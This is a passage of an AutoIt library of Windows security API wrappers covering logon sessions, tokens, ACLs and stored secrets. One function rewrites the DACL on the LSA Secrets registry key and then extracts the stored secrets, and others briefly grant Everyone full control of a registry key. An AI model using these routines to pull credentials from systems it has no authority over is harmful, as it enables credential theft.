Func _RegGetKeySecuritySacl($hMainKey, $sSubKey)
	Local $aAceList, $pSecurDesc, $pSACL, $iSysError

	$pSecurDesc = _RegGetKeySecurity($hMainKey, $sSubKey, $SACL_SECURITY_INFORMATION)
	$iSysError = @error
	$pSACL = _GetSecurityDescriptorSacl($pSecurDesc)
	$aAceList = _GetExplicitEntriesFromAcl($pSACL)
	Return SetError($iSysError, _HeapFree($pSecurDesc), $aAceList)
EndFunc	;==>_RegGetKeySecuritySacl

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaEnumerateLogonSessions
; Description	: This function lists the logon sessions.
; Parameter(s)	: This function has no parameters.
; Return values	: If succeeds, returns an array in the following format:
;		: - $aArray[0][0] - The number of returned logon sessions.
;		: - $aArray[1][0] - The low part of the first LUID (locally unique identifier).
;		: - $aArray[1][1] - The high part of the first LUID.
;		: - $aArray[n][0] - The low part of the Nth LUID.
;		: - ... ...
; Author	: Pusofalse
; =======================================================================
Func _LsaEnumerateLogonSessions()
	Local $tLuid, $iResult, $aResult[1][9], $aTemp

	$iResult = DllCall("Secur32.dll", "long", "LsaEnumerateLogonSessions", "ulong*", 0, "ptr*", 0)
	If $iResult[0] Then Return SetError(_LsaNtStatusToWinError($iResult[0]), 0, $aResult)

	Redim $aResult[$iResult[1] + 1][9]
	$aResult[0][0] = $iResult[1]
	For $i = 1 to $iResult[1]
		$tLuid = DllStructCreate($tagLUID, $iResult[2])
		$aResult[$i][0] = DllStructGetData($tLuid, "Low")
		$aTemp = _LsaGetLogonSessionData($aResult[$i][0])
		For $g = 1 to 8
			$aResult[$i][$g] = $aTemp[$g]
		Next
		$iResult[2] += 8
	Next
	Return SetExtended(_LsaFreeReturnBuffer($iResult[2]), $aResult)
EndFunc	;==>_LsaEnumerateLogonSessions

Func _LsaGetLogonSessionData($iLuidLow, $iLuidHigh = 0)
	Local $pLuid, $iResult, $tSession, $pSession, $aResult[9], $tagSession, $pSid

	$pLuid = _InitializeLuid($iLuidLow, $iLuidHigh)
	$iResult = DllCall("Secur32.dll", "long", "LsaGetLogonSessionData", "ptr", $pLuid, "ptr*", 0)
	If $iResult[0] Then Return SetError(_LsaNtStatusToWinError($iResult[0]), 0, $aResult)

	$tagSession = "ulong;dword;long;ushort[2];ptr;ushort[2];ptr;ushort[2];ptr;ulong[2];" & _
				"ptr;int64;ushort[2];ptr;ushort[2];ptr;ushort[2];ptr"

	$tSession = DllStructCreate($tagSession, $iResult[2])
	$aResult[0] = DllStructGetData($tSession, 2)	; LogonID
	$aResult[1] = _LsaInitializeBufferW(DllStructGetPtr($tSession, 4), 1)	; UserName
	$aResult[2] = _LsaInitializeBufferW(DllStructGetPtr($tSession, 6), 1)	; Domain
	If $aResult[2] Then $aResult[1] = $aResult[2] & "\" & $aResult[1]	; 
	$aResult[2] = _LsaInitializeBufferW(DllStructGetPtr($tSession, 8), 1)	; Package
	$aResult[3] = _LsaInitializeBufferW(DllStructGetPtr($tSession, 13), 1)	; Server
	$aResult[4] = _LsaInitializeBufferW(DllStructGetPtr($tSession, 15), 1)	; DnsDomain
	$aResult[5] = _LsaInitializeBufferW(DllStructGetPtr($tSession, 17), 1)	; Upn
	$aResult[6] = DllStructGetData($tSession, 10, 1)		; LogonType
	$pSid = _CopySid(DllStructGetData($tSession, 11))	;
	$aResult[7] = _ConvertSidToStringSid($pSid)	; SID
	$aResult[8] = DllStructGetData($tSession, 12)	; LogonTime
	_LsaFreeReturnBuffer($iResult[2])
	Return SetExtended(_HeapFree($pSid)*_HeapFree($pLuid), $aResult)
EndFunc	;==>_LsaGetLogonSessionData

Func _LsaEnumerateLogonSessionProcesses($iLuidLow, $iLuidHigh = 0)
	Local $iLuid, $iResult, $tBuffer, $pBuffer, $aProcess, $aProc[1][2]
	Local $hToken, $aPriv[1][2] = [[$SE_DEBUG_NAME, 2]], $aStatic

	$hToken = _OpenProcessToken(-1)
	If Not _IsPrivilegeEnabled($hToken, $SE_DEBUG_NAME) Then
		_AdjustTokenPrivileges($hToken, $aPriv)
	EndIf
	_LsaCloseHandle($hToken)
	$iLuid = _LsaMakeLong64($iLuidLow, $iLuidHigh)

	$aProcess = ProcessList()
	For $i = 1 to $aProcess[0][0]
		$hToken = _OpenProcessToken($aProcess[$i][1], $TOKEN_QUERY)
		If $hToken = 0 Then ContinueLoop
		$aStatic = _GetTokenStatistics($hToken)
		_LsaCloseHandle($hToken)
		If $aStatic[1] = $iLuid Then
			$aProc[0][0] += 1
			Redim $aProc[$aProc[0][0] + 1][2]
			$aProc[$aProc[0][0]][0] = $aProcess[$i][1]
			$aProc[$aProc[0][0]][1] = $aProcess[$i][0]
		EndIf
	Next
	Return SetExtended(_FreeVariable($aProcess), $aProc)
EndFunc	;==>_LsaEnumerateLogonSessionProcesses

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaGetUserName
; Description	: Retrieves the name of the currently logged user account or user associated to the current thread.
; Parameter(s)	: $fThread	- If true, the function returns the user name associated to the current thread. If false, the function returns the name of the currently logged user account. Default to True.
; Return values	: If succeeds, returns user name requested, else returns NULL and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _LsaGetUserName($fThread = True)
	Local $aPriv[1][2] = [[$SE_DEBUG_NAME, 2]]
	Local $iPid, $hToken, $pSid, $sUserName, $hProcess

	If $fThread = True or Not ProcessExists("explorer.exe") Then
		$pSid = _LookupAccountName(@UserName)
		$sUserName = _LookupAccountSid($pSid)
		Return SetError(@error, _HeapFree($pSid), $sUserName)
	Else
		$iPid  = ProcessExists("explorer.exe")
		If $iPid = 0 Then
			$pSid = _LookupAccountName(@UserName)
			$sUserName = _LookupAccountSid($pSid)
			Return SetError(@error, _HeapFree($pSid), $sUserName)
		EndIf
		$hToken = _OpenProcessToken(-1)
		_AdjustTokenPrivileges($hToken, $aPriv)
		_LsaCloseHandle($hToken)
		$hProcess = _OpenProcess("explorer.exe", $READ_CONTROL)
		$sUserName = _QueryKernelObjectSecurityOwner($hProcess)
		Return SetError(@error, _LsaCloseHandle($hProcess), $sUserName)
	EndIf
EndFunc	;==>_LsaGetUserName

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaGetUserRelativeID
; Description	: Retrieves a string that indicates the user right, such as an administrator or guest or other.
; Parameter(s)	: $sUserName	- The name of the user account to determine.
;		: $sSystem	- The system where the $sUserName lies in, default is local.
; Return values	: If succeeds, return value is one of the following string:
;		:	NONE$ - indicates an user that has no any user rights.
;		:	ADMINISTRATOR$ - indicates an administrator.
;		:	USER$ - indicates an user.
;		:	GUEST$ - indicates a guest.
;		:	POWER_USER$ - indicates a power user.
;		:	ACCOUNT_OPS$ - indicates an user that permits control over nonadministrator accounts.
;		:	SYSTEM_OPS$ - indicates an user that can perform system administrative functions, not including security functions. It establishes network shares, controls printers, unlocks workstations, and performs other operations.
;		:	PRINT_OPS$ - indicates an user that can control printers and print queues.
;		:	BACKUP_OPS$ - indicates an user used for controlling assignment of file backup-and-restore privileges.
;		:	REPLICATOR$ - indicates an user used only by the system.
;		:	UDR_*_*...$ - indicates an user that has the user-defined user rights, see Remarks section for details.
;		: If fails, returns a character $, if $sUserName does not exist in $sSystem, the function returns this value.
; Author	: Pusofalse
; Remarks	: If the $sUserName belongs 2 or more user groups, such as ADMINISTRATORS and POWER USERS, this function returns ADMINISTRATOR$ but not POWER_USER$, because the user rights of ADMINISTRATORS is higher than POWER USERS's, this is the case that the $sUserName belongs a well-known user group. Another case, if $sUserName belongs an user-created user group, the prefix of return value is set to UDR, in which case, the middle part of the return value is _*_*..., where * is the user group name the $sUserName belongs, the number of _* depends on the number of the user groups the $sUserName belongs. If $sUserName does not belong any user group, the return value is set to NONE$, you can determine the user rights by calling the _LsaEnumerateAccountRights function. The suffix of the return value of this function is always set to $.
; =======================================================================
Func _LsaGetUserRelativeID($sUserName, $sSystem = "")
	Local $iResult, $pSid, $iType, $aGroup, $iRid, $iHiRid = 0x1F0FFF

	$pSid = _LookupAccountName($sUserName, $sSystem)
	$iType = @extended
	If Not _IsValidSid($pSid) Then Return SetError(@error, 0, "$")
	If $iType <> $SID_IS_USER Then Return SetError(87, 0, "$")
	If _GetSidSubAuthorityCount($pSid) <> 5 Then Return SetError(87, 0, "$")
	$aGroup = _LsaLocalUserGetGroups($sUserName, $sSystem)
	If $aGroup[0] = 0 Then Return SetError(@error, 1, "NONE$")

	For $i = 1 to $aGroup[0]
		$pSid = _LookupAccountName($aGroup[$i], $sSystem)
		$iRid = _GetSidSubAuthority($pSid, 1)
		If $iRid < $iHiRid Then $iHiRid = $iRid
		_HeapFree($pSid)
	Next
	Switch $iHiRid
	Case $DOMAIN_ALIAS_RID_ADMINS
		Return "ADMINISTRATOR$"
	Case $DOMAIN_ALIAS_RID_USERS
		Return "USER$"
	Case $DOMAIN_ALIAS_RID_GUESTS
		Return "GUEST$"
	Case $DOMAIN_ALIAS_RID_POWER_USERS
		Return "POWER_USER$"
	Case $DOMAIN_ALIAS_RID_ACCOUNT_OPS
		Return "ACCOUNT_OPS$"
	Case $DOMAIN_ALIAS_RID_SYSTEM_OPS
		Return "SYSTEM_OPS$"
	Case $DOMAIN_ALIAS_RID_PRINT_OPS
		Return "PRINT_OPS$"
	Case $DOMAIN_ALIAS_RID_BACKUP_OPS
		Return "BACKUP_OPS$"
	Case $DOMAIN_ALIAS_RID_REPLICATOR
		Return "REPLICATOR$"
	Case Else
		Local $sGroup
		For $i = 1 to $aGroup[0]
			$sGroup &= "_" & $aGroup[$i]
		Next
		Return "UDR" & StringUpper($sGroup) & "$"
	EndSwitch
EndFunc	;==>_LsaGetUserRelativeID

; #### FUNCTION ####
; =======================================================================
; This function is internal used, used to release the memory allocated by the other functions.
; =======================================================================
Func _LsaFreeReturnBuffer($pBuffer)
	Local $iResult
	$iResult = DllCall("Secur32.dll", "int", "LsaFreeReturnBuffer", "ptr", $pBuffer)
	Return SetError(_LsaNtStatusToWinError($iResult[0]), 0, $iResult[0] = 0)
EndFunc	;==>_LsaFreeReturnBuffer

; #### FUNCTION ####
; =======================================================================
; Name	: _DuplicateTokenEx
; Description	: This function creates a new access token that duplicates an existing token.
; Parameter(s)	: $hToken	- A handle to the access token to be duplicated.
;		: $iAccess	- A value of access mask value, zero indicates the same access rights.
;		: $pSecurAttr	- A pointer to a SECURITY_ATTRIBUTES that specifies a security descriptor for the new access token and determines whether child processes can inherit the token. This parameter can be zero.
;		: $iLevel	- Indicates the impersonation level of the new token, or -1 indicates the same level.
;		: $iType	- Specifies the type of the new access token, a value of 1 indicates the token is a primary token, a value of 2 indicates the token is a impersonation token. Use -1 to use the same type.
; Return values	: If succeeds, returns an handle to the duplicated access token, else returns zero and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _DuplicateTokenEx($hToken, $iAccess = 0, $pSecurAttr = 0, $iLevel = -1, $iType = -1)
	Local $iResult

	If $iType = -1 Then $iType = _GetTokenType($hToken)
	If $iLevel = -1 Then $iLevel = _GetTokenImpersonationLevel($hToken)

	$iResult = DllCall("Advapi32.dll", "int", "DuplicateTokenEx", _
			"hWnd", $hToken, "dword", $iAccess, _
			"ptr", $pSecurAttr, "int", $iLevel, _
			"dword", $iType, "hWnd*", 0)
	Return SetError(_GetLastError(), 0, $iResult[6])
EndFunc	;==>_DuplicateTokenEx

; #### FUNCTION ####
; =======================================================================
; Name	: _CheckTokenMembership
; Description	: Determines whether a specified security identifier (SID) is enabled in an access token.
; Parameter(s)	: $hToken	- A handle to the access token.
;		: $pSid	- A pointer to a SID or an user account name string.
; Return values	: If the SID is present and has the SE_GROUP_ENABLED attribute, returns TRUE; otherwise, it returns FALSE.
; Author	: Pusofalse
; =======================================================================
Func _CheckTokenMembership($hToken, $pSid)
	Local $iResult

	If Not _IsValidSid($pSid) Then
		$pSid = _LookupAccountName($pSid)
		If Not _IsValidSid($pSid) Then Return SetError(@error, 0, 0)
	EndIf
	If _GetTokenType($hToken) = 1 Then $hToken = _DuplicateTokenEx($hToken, 0, 0, 1, 2)
	If Not $hToken Then Return SetError(@error, 0, 0)

	$iResult = DllCall("Advapi32.dll", "int", "CheckTokenMembership", _
			"hWnd", $hToken, "ptr", $pSid, "int*", 0)
	Return SetError(_GetLastError(), 0, $iResult[3])
EndFunc	;==>_CheckTokenMembership

; #### FUNCTION ####
; =======================================================================
; Name	: _LookupPrivilegeOnLoggedUser
; Description	: Check 2 access control lists (ACLs), and retrieve one of them which contains higher user rights for currently logged user account.
; Parameters	: $pAcl1	- The first pointer to an access control list.
;		: $pAcl2	- The second pointer to an access control list.
; Return values	: If $pAcl1 is an invalid ACL pointer, the function sets @error to ERROR_INVALID_ACL, @extended is set to 1. -
;		: + If $pAcl2 is an invalid ACL pointer, the function sets @error to ERROR_INVALID_ACL either, @extend is set to 2. -
;		: + If either $pAcl1 or $pAcl2 is not a valid ACL pointer, the return value is zero. -
;		: + If the function cannot obtain the SID of the current user account, sets @error to ERROR_INVALID_SID. -
;		: + If neither $pAcl1 nor $pAcl2 enables any user right (or enables DENY- USER RIGHT), the return value is set to zero, -
;		: +	@error is set to 0, and @extended is set to -1. -
;		: + If both $pAcl1 and $pAcl2 are enables user right (GRANT - USER RIGHT), @error is set to zero, -
;		: +	If $pAcl1 enables higher user rights for currently logged user than $pAcl2, the return value is same to $pAcl1, -
;		: +	and sets @extended to 1. -
;		: +	If the user rights enabled in $pAcl1 are same to user rights enabled in $pAcl2, the return value is same to $pAcl1 either, -
;		: +	@extended is set to 2. -
;		: +	If $pAcl2 obtains higher user rights for current user account than $pAcl1 obtains, the return values is same to $pAcl2, -
;		: +	@extended is set to 3.
; Remarks		: Note that the $pAcl1 and $pAcl2 must both point a same security object, else, the function has no meaning.
; Author		: Pusofalse
; =======================================================================
Func _LookupPrivilegeOnLoggedUser($pAcl1, $pAcl2)
	Local $iAccessMask1, $iAccessMask2, $pSid

	If Not _IsValidAcl($pAcl1) Then Return SetError(@error, 1, 0)
	If Not _IsValidAcl($pAcl2) Then Return SetError(@error, 2, 0)

	$pSid = _LookupAccountName(@UserName)
	$iAccessMask1 = _GetEffectiveRightsFromAcl($pAcl1, $pSid)
	$iAccessMask2 = _GetEffectiveRightsFromAcl($pAcl2, $pSid)

	If ($iAccessMask1 = 0 And $iAccessMask2 = 0) Then Return SetError(0, -1, -1)

	_HeapFree($pSid)
	If $iAccessMask1 > $iAccessMask2 Then
		Return SetError(0, 1, $pAcl1)
	ElseIf $iAccessMask1 < $iAccessMask2 Then
		Return SetError(0, 2, $pAcl2)
	Else
		Return SetError(0, 3, $pAcl2)
	EndIf
EndFunc	;==>_LookupPrivilegeOnLoggedUser

; #### FUNCTION ####
; =======================================================================
; Name	: _CheckAclMemberShip
; Description	: The function checks whether the specified user account is assigned allowed access rights in specified access control list (ACL).
; Parameters	: $pAcl	- A pointer to an access control list (ACL).
;		: $pSid	- Either a SID pointer or a string contains the user name, in which case, $pSid must be an user on local system.
; Return values	: If $pAcl is not a valid ACL pointer, sets @error to ERROR_INVALID_ACL, returns zero. -
;		: + If $pSid is not a valid SID pointer or a non-existing user account, sets @error to ERROR_INVALID_SID, and returns zero either.
;		: + If both $pAcl and $pSid are valid pointer, and user account ($pSid) is assigned allowed access rights, the return value is non-zero, otherwise returns zero.
; Author		: Pusofalse
; =======================================================================
Func _CheckAclMemberShip($pAcl, $pSid)
	Local $iResult, $iAccessMask

	If Not _IsValidAcl($pAcl) Then Return SetError(@error, 1, 0)
	If Not _IsValidSid($pSid) Then
		Local $tSid = _LookupAccountName($pSid)
		$pSid = DllStructGetPtr($tSid)
		If Not _IsValidSid($pSid) Then Return SetError(@error,2, 0)
	EndIf
	Return _GetEffectiveRightsFromAcl($pAcl, $pSid)
EndFunc	;==>_CheckAclMemberShip

Func _LogonUser($sUser, $sPswd, $sDomain, $iType, $iProvider = $LOGON32_PROVIDER_DEFAULT)
	Local $iResult
	$iResult = DllCall("Advapi32.dll", "int", "LogonUser", _
			"str", $sUser, "str", $sDomain, _
			"str", $sPswd, "dword", $iType, _
			"dword", $iProvider, "hWnd*", 0)
	Return SetError(_GetLastError(), 0, $iResult[6])
EndFunc	;==>_LogonUser

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaCreateSecret
; Description	: This function creates a secret.
; Parameter(s)	: $sSecret	- The name of the secret.
;		: $sData	- The data of the secret.
; Return values	: If succeeds, returns true, else returns false and sets @error to a system error code.
; Author	: Pusofalse
; Remarks	: This function requires a call to _LsaCreateSecretManager function, else, the function fails and @error is set ERROR_FILE_NOT_FOUND (2).
; =======================================================================
Func _LsaCreateSecret($sSecret, $sData)
	Local $sGUID, $iResult, $aOrgSecur, $pNewDacl, $iLUID
	Local $iAccess = bitOR($READ_CONTROL, $WRITE_DAC)
	Local $aNewAce[1][4] = [["Everyone", 0xF003F, 1, 3]], $bCrypted, $bSid1, $bSid2
	Local $aAccess[2][4] = [["SYSTEM", 0xF003F, 1, 3], ["Administrators", $iAccess, 1, 0]]

	If _RegSetKeySecurityDacl(0x80000002, "SYSTEM\SECRET", $aNewAce) = 0 Then
		Return SetError(@error, 0, 0)
	EndIf

	$pGUID = _AllocateGUID()
	$sGUID = _StringFromGUID($pGUID)
	_HeapFree($pGUID)

	$bSid1 = _CryptProtectData(_LsaGetUserName(0))
	$bSid2 = _CryptProtectData(_LsaGetUserName(1))
	$bCrypted = _CryptProtectData($sData)
	$bSecret = _CryptProtectData($sSecret)
	If RegWrite("HKLM\SYSTEM\SECRET\" & $sGUID, "Name", "Reg_Binary", $bSecret) = 0 Then Return SetError(@error, -1, 0)
	If RegWrite("HKLM\SYSTEM\SECRET\" & $sGUID, "Data", "Reg_Binary", $bCrypted) = 0 Then Return SetError(@error, 1, 0)
	If RegWrite("HKLM\SYSTEM\SECRET\" & $sGUID, "SID1", "Reg_Binary", $bSid1) = 0 Then Return SetError(@error, 2, 0)
	If RegWrite("HKLM\SYSTEM\SECRET\" & $sGUID, "SID2", "Reg_Binary", $bSid2) = 0 Then Return SetError(@error, 3, 0)

	If _RegSetKeySecurityDacl(0x80000002, "SYSTEM\SECRET", $aAccess) = 0 Then
		Return SetError(@error, 0, 0)
	EndIf
	Return 1
EndFunc	;==>_LsaCreateSecret

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaCreateSecretManager
; Description	: Creates a secrets database.
; Parameter(s)	: The function has no parameters.
; Return values	: A BOOLEAN value indicates success or failure.
; Author	: Pusofalse
; =======================================================================
Func _LsaCreateSecretManager()
	Local $iResult, $iAccess = bitOR($READ_CONTROL, $WRITE_DAC), $hKey
	Local $aAccess[2][4] = [["SYSTEM", 0xF003F, 1, 3], ["Administrators", $iAccess, 1, 0]]

	$hKey = _RegOpenKeyEx(0x80000002, "SYSTEM\SECRET", $READ_CONTROL)
	If $hKey = 0 Then
		If RegWrite("HKEY_LOCAL_MACHINE\SYSTEM\SECRET") = 0 Then
			Return SetError(@error, 0, 0)
		EndIf
	Else
		_RegCloseKey($hKey)
	EndIf
	If _RegSetKeySecurityDacl(0x80000002, "SYSTEM\SECRET", $aAccess) = 0 Then
		Return SetError(@error, 0, 0)
	EndIf
	Return 1
EndFunc	;==>_LsaCreateSecretManager

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaDeleteSecret
; Description	: This function deletes a secret from secrets database.
; Parameter(s)	: $sSecret	- The name of the secret.
;		: $fAll	- If true, the function deletes all secrets that has the name of the $sSecret.
; Return values	: Returns true if succeeds, else returns false.
; Author	: Pusofalse
; =======================================================================
Func _LsaDeleteSecret($sSecret, $fAll = True)
	Local $sGUID, $sKey, $iResult = True
	Local $aNewAce[1][4] = [["Everyone", 0xF003F, 1, 3]]
	Local $iAccess = bitOR($READ_CONTROL, $WRITE_DAC)
	Local $aAccess[2][4] = [["SYSTEM", 0xF003F, 1, 3], ["Administrators", $iAccess, 1, 0]]

	If _RegSetKeySecurityDacl(0x80000002, "SYSTEM\SECRET", $aNewAce) = 0 Then
		Return SetError(@error, 5, "")
	EndIf

	$sGUID = _LsaGetSecret($sSecret)
	If $sGUID = "" Then Return SetError(@error, 0, 0)
	$sKey = "HKLM\SYSTEM\SECRET\" & $sGUID

	If $fAll = True Then
		Do
			$iResult = RegDelete($sKey) And $iResult
			$sGUID = _LsaGetSecret($sSecret)
			$sKey = "HKLM\SYSTEM\SECRET\" & $sGUID
		Until	$sGUID = ""
	Else
		$iResult = RegDelete($sKey)
	EndIf
	If _RegSetKeySecurityDacl(0x80000002, "SYSTEM\SECRET", $aAccess) = 0 Then
		Return SetError(@error, 5, "")
	EndIf
	Return $iResult
EndFunc	;==>_LsaDeleteSecret

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaEnumerateSecrets
; Description	: This function lists all secrets in secrets database.
; Parameter(s)	: This function has no parameters.
; Return values	: Returns an array with following format:
;		: - $aArray[0] - The number of returned secrets.
;		: - $aArray[1] - The name of the first secret.
;		: - $aArray[2] - The name of the 2nd secret.
;		: - ... ...
; Author	: Pusofalse
; =======================================================================
Func _LsaEnumerateSecrets()
	Local $aResult[1] = [0], $sSecret, $iIndex
	Local $aNewAce[1][4] = [["Everyone", 0xF003F, 1, 3]]
	Local $iAccess = bitOR($READ_CONTROL, $WRITE_DAC)
	Local $aAccess[2][4] = [["SYSTEM", 0xF003F, 1, 3], ["Administrators", $iAccess, 1, 0]]

	If _RegSetKeySecurityDacl(0x80000002, "SYSTEM\SECRET", $aNewAce) = 0 Then
		Return SetError(@error, 5, $aResult)
	EndIf

	While 1
		$iIndex += 1
		$sSecret = RegEnumKey("HKLM\SYSTEM\SECRET", $iIndex)
		If @error Then ExitLoop
		$sSecret = RegRead("HKLM\SYSTEM\SECRET\" & $sSecret, "Name")
		$aResult[0] = $iIndex
		Redim $aResult[$iIndex + 1]
		$aResult[$iIndex] = _CryptUnprotectData("0x" & $sSecret)
	WEnd
	If _RegSetKeySecurityDacl(0x80000002, "SYSTEM\SECRET", $aAccess) = 0 Then
		Return SetError(@error, 5, $aResult)
	EndIf
	Return $aResult
EndFunc	;==>_LsaEnumerateSecrets

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaGetSecret
; Description	: This function retrieves the GUID of the specified secret.
; Parameter(s)	: $sSecret	- The name of the secret.
; Return values	: If succeeds, returns a GUID string.
; Author	: Pusofalse
; =======================================================================
Func _LsaGetSecret($sSecret)
	Local $iResult, $iIndex = 1, $sKey = "HKLM\SYSTEM\SECRET", $iFlag = 0
	Local $aNewAce[1][4] = [["Everyone", 0xF003F, 1, 3]], $s_key, $s_name
	Local $iAccess = bitOR($READ_CONTROL, $WRITE_DAC)
	Local $aAccess[2][4] = [["SYSTEM", 0xF003F, 1, 3], ["Administrators", $iAccess, 1, 0]]

	If _RegSetKeySecurityDacl(0x80000002, "SYSTEM\SECRET", $aNewAce) = 0 Then
		Return SetError(@error, 5, "")
	EndIf

	While 1
		$s_key = RegEnumKey($sKey, $iIndex)
		If @error Then ExitLoop
		$s_name = RegRead($sKey & "\" & $s_key, "Name")
		$s_name = _CryptUnprotectData("0x" & $s_name)
		If $s_name = $sSecret Then
			$iFlag = 1
			ExitLoop
		EndIf
		$iIndex += 1
	WEnd
	If _RegSetKeySecurityDacl(0x80000002, "SYSTEM\SECRET", $aAccess) = 0 Then
		Return SetError(@error, 5, "")
	EndIf
	If $iFlag = 0 Then Return SetError(2, 0, "")
	Return SetError(0, 0, $s_key)
EndFunc	;==>_LsaGetSecret

Func _LsaQuerySecret($sSecret, $iSecretLevel = 3)
	Local $sGUID, $sName, $sData, $sUser1, $sUser2, $tSecret, $tGUID
	Local $aNewAce[1][4] = [[@UserName, 0xF003F, 1, 3]]
	Local $iAccess = bitOR($READ_CONTROL, $WRITE_DAC), $_tagSECRET
	Local $aAccess[2][4] = [["SYSTEM", 0xF003F, 1, 3], ["Administrators", $iAccess, 1, 0]]

	$sGUID = _LsaGetSecret($sSecret)
	If $sGUID = "" or @error Then Return SetError(@error, 0, 0)
	$sKey = "HKLM\SYSTEM\SECRET\" & $sGUID

	If _RegSetKeySecurityDacl(0x80000002, "SYSTEM\SECRET", $aNewAce) = 0 Then
		Return SetError(@error, 5, "")
	EndIf

	$sName = _CryptUnprotectData("0x" & RegRead($sKey, "Name"))
	$sData = _CryptUnprotectData("0x" & RegRead($sKey, "Data"))
	$sUser1 = _CryptUnprotectData("0x" & RegRead($sKey, "SID1"))
	$sUser2 = _CryptUnprotectData("0x" & RegRead($sKey, "SID2"))

	If _RegSetKeySecurityDacl(0x80000002, "SYSTEM\SECRET", $aAccess) = 0 Then
		Return SetError(@error, 5, "")
	EndIf

	$_tagSECRET = $tagSECRET & ";wchar Name[" & StringLen($sName) * 2 + 2 & "];wchar Data[" & StringLen($sData) * 2 + 2 & "]"
	$tSecret = DllStructCreate($_tagSECRET)
	DllStructSetData($tSecret, "Name", $sName)
	DllStructSetData($tSecret, "SecretName", DllStructGetPtr($tSecret, "Name"))
	If bitAND($iSecretLevel, $SECRET_INFORMATION_SID1) Then DllStructSetData($tSecret, "SID1", _LookupAccountName($sUser1))
	If bitAND($iSecretLevel, $SECRET_INFORMATION_SID2) Then DllStructSetData($tSecret, "SID2", _LookupAccountName($sUser2))
	If bitAND($iSecretLevel, $SECRET_INFORMATION_DATA) Then
		DllStructSetData($tSecret, "Data", $sData)
		DllStructSetData($tSecret, "SecretData", DllStructGetPtr($tSecret, "Data"))
	EndIf
	If bitAND($iSecretLevel, $SECRET_INFORMATION_GUID) Then
		$tGUID = _GUIDFromString($sGUID)
		DllStructSetData($tSecret, "Guid", DllStructGetData($tGUID, "Guid"))
		_FreeVariable($tGUID)
	EndIf
	Return $tSecret
EndFunc	;==>_LsaQuerySecret

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaEnumeratePrivateData
; Description	: This function lists all the private data stored in private database.
; Parameter(s)	: This function has no parameters.
; Return values	: If succeeds, returns an array with following format:
;		:	- $aArray[0] - The number of entry returned.
;		:	- $aArray[1] - The name of the first private data.
;		:	- $aArray[2] - The second private data's name.
;		:	- ... ...
;		: If fails, the value of $aArray[0] is set to zero and @error is set to a system error code.
; Author	: Pusofalse
; Remarks		: This function requires the administration user right.
; =======================================================================
Func _LsaEnumeratePrivateData()
	Local $aResult[1][2] = [[0]], $aSecur, $iIndex, $sKey
	Local $aAceList[1][4] = [[@UserName, 0xF003F, 1, 3]]

	$aSecur = _GetNamedSecurityInfo("Machine\SECURITY\Policy\Secrets", 4, 4)
	If $aSecur[0] or Not _IsValidAcl($aSecur[6]) Then Return SetError($aSecur[0], 0, $aResult)
	If Not _RegSetKeySecurityDacl(0x80000002, "SECURITY\Policy\Secrets", $aAceList) Then
		Return SetError(@error, 0, $aResult)
	EndIf

	While 1
		$iIndex += 1
		$sKey = RegEnumKey("HKLM\SECURITY\Policy\Secrets", $iIndex)
		If @error Then ExitLoop
		$aResult[0][0] += 1
		Redim $aResult[$aResult[0][0] + 1][2]
		$aResult[$aResult[0][0]][0] = $sKey
		$aResult[$aResult[0][0]][1] = _LsaRetrievePrivateData($sKey, "", 1)
	WEnd
	If Not _SetNamedSecurityInfo("Machine\SECURITY\Policy\Secrets", 4, 4, 0, 0, $aSecur[6], 0) Then
		Local $a_result[1] = [0]
		Return SetError(@error, 0, $a_result)
	EndIf
	Return $aResult
EndFunc	;==>_LsaEnumeratePrivateData

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaRetrievePrivateData
; Description	: This function retrieves the private data.
; Parameter(s)	: $sKeyName	- Specify the key name under which the private data is stored.
;		: $sSystem	- Specify the system on which the function executes, default to local system.
; Return values	: If succeeds, the return value is the private data in binary format. If fails, returns NULL and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _LsaRetrievePrivateData($sKeyName, $sSystem = "", $fLengthOnly = 0)
	Local $hPolicy, $iResult, $pKeyName, $bData, $iSize, $tBuffer

	$hPolicy = _LsaOpenPolicy($POLICY_GET_PRIVATE_INFORMATION, $sSystem)
	If $hPolicy = 0 Then Return SetError(@error, 0, 0)

	$pKeyName = _LsaInitializeBufferW($sKeyName)
	$iResult = DllCall("Advapi32.dll", "dword", "LsaRetrievePrivateData", _
			"hWnd", $hPolicy, "ptr", $pKeyName, "ptr*", 0)
	$iSize = _LsaLocalSize($iResult[3]) - 12
	If $fLengthOnly = 1 Then
		Return SetError(_LsaNtStatusToWinError($iResult[0]), _LsaFreeMemory($iResult[3]), $iSize)
	EndIf
	$tBuffer = DllStructCreate("byte[" & $iSize & "]", $iResult[3] + 12)
	$bData = DllStructGetData($tBuffer, 1)
	_LsaClose($hPolicy)
	_FreeVariable($tBuffer)
	_HeapFree($pKeyName)
	_LsaFreeMemory($iResult[3])
	Return SetError(_LsaNtStatusToWinError($iResult[0]), $iSize, $bData)
EndFunc	;==>_LsaRetrievePrivateData

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaStorePrivateData
; Description	: This function creates the private data in private database.
; Parameter(s)	: $sKeyName	- Specify the name of the private data, add one of the following prefixes to the key name:
;		:	- L$	- For local object.
;		:	- G$	- For global object.
;		:	- M$	- For computer object.
;		: $sData		- Specify the private data to store.
;		: $fProtect	- If true, the function encrypts the data by using the LSA_DEDICATED_KEY1.
;		: $sSystem	- Specify the system name on which the function executes, default to local system.
; Return values	: True indicates success, false indicates failure.
; Author	: Pusofalse
; =======================================================================
Func _LsaStorePrivateData($sKeyName, $sData, $fProtect = False, $sSystem = "")
	Local $hPolicy, $pKeyName, $pData, $sEntropy, $pSid

	$hPolicy = _LsaOpenPolicy($POLICY_CREATE_SECRET, $sSystem)
	If $hPolicy = 0 Then Return SetError(@error, 0, 0)

	If $fProtect = True AND IsString($sData) Then
		$sEntropy = $LSA_DEDICATED_KEY1
		$sData = _CryptProtectData($sData, $sEntropy, 0)
	EndIf

